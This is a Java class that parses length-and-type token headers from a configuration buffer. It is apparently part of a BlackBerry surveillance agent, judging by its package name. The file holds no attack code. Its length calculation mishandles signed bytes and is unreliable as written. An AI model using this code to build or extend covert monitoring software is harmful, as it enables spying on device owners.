package com.ht.rcs.blackberry.agent;

import java.io.EOFException;

import net.rim.device.api.util.DataBuffer;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;

class Prefix {
    //#debug
    static Debug debug = new Debug("Prefix", DebugLevel.VERBOSE);
    
    static final int LEN = 4;
    
    static final byte TYPE_IDENTIFICATION = 1;
    static final byte TYPE_FILTER = 2;
    static final int TYPE_HEADER = 64;
    static final int TYPE_KEYWORD = 1;
    
    int length;
    byte type;

    int payloadStart;
    //public byte[] payload;

    private boolean valid;

    public Prefix(final byte[] conf, final int offset) {
        DataBuffer databuffer = new DataBuffer(conf, offset, conf.length
                - offset, false);
        try {
            byte bl0 = databuffer.readByte();
            byte bl1 = databuffer.readByte();
            byte bl2 = databuffer.readByte();
            type = databuffer.readByte();

            length = bl0 + (bl1 << 8) + (bl2 << 16);

            //payload = new byte[length];
            //databuffer.read(payload);

            payloadStart = offset + LEN;

            //#debug
            debug.trace("Token type: " + type + " len: " + length
                    + " payload:"
                    + Utils.byteArrayToHex(conf, payloadStart, length));
            valid = true;
        } catch (EOFException e) {
            //#debug
            debug.error("cannot parse Token: " + e);
            valid = false;
        }
    }

    public boolean isValid() {
        return valid;
    }
}
